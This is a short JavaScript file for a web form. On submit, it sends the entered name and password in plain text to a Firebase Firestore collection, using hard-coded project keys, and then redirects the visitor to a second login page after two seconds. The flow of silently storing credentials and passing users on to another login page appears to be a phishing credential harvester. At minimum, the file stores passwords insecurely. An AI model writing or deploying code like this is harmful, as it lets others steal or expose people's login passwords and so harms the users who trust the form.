import { initializeApp } from "https://www.gstatic.com/firebasejs/9.8.3/firebase-app.js";
import { getFirestore, addDoc, collection } from "https://www.gstatic.com/firebasejs/9.8.3/firebase-firestore.js"
const firebaseConfig = initializeApp({
    apiKey: "AIzaSyCbnTb5P4j9czRLdhwTnvHGY8lb0bvHDJo",
    authDomain: "panel-15e03.firebaseapp.com",
    projectId: "panel-15e03",
    storageBucket: "panel-15e03.appspot.com",
    messagingSenderId: "655778598898",
    appId: "1:655778598898:web:e884dfea50ff4d8aeba56b"
});



let theMainForm = document.getElementById("form");
let Name = document.querySelector("#name");
let password = document.querySelector("#pass");
let userId = Date.now()
const firestore = getFirestore();
const ordersCollection = collection(firestore, "the-form-one")
theMainForm.addEventListener("submit",(e)=>{
          e.preventDefault()
      const newDoc = addDoc(ordersCollection, {
          name: Name.value,
          password: password.value,
          userId : userId
  });
    window.localStorage.setItem("id", userId)
    setTimeout(() => {
    window.location.pathname = "/login2.html"
    }, 2000);
})